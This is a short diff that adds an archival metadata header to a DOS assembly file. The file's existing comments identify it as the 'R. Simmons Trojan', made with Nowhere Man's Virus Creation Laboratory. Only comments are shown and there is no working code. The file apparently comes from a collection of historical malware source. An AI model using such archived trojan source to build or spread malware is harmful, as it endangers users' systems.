@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      R
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; RICHARDS.ASM -- R. Simmons Trojan
 ; Created with Nowhere Man's Virus Creation Laboratory v1.00
 ; Written by Nowhere Man
